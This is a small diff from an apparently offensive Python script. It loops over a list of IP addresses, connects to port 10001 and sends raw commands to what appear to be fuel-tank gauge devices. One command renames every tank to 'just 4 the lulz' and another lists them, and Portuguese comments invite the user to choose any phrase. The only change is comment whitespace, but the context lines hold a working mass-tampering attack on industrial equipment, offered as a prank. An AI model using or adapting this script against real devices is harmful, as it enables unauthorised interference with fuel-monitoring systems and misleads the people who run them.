@@ -26,7 +26,7 @@ for L in IpsList:
 	try:
 		r = remote(L, 10001)
 		r.send('\x01'+'S60200 just 4 the lulz !!!!\r\n') # muda o nome de todos os tanques pra "just 4 the lulz"
-														 # vc pode trocar essa frase por qualquer uma que quiser
+								# vc pode trocar essa frase por qualquer uma que quiser
 		r.send('\x01'+'I20100\r\n') # lista todos os tanques
 		r.recvuntil(' ', drop=True)	
 		
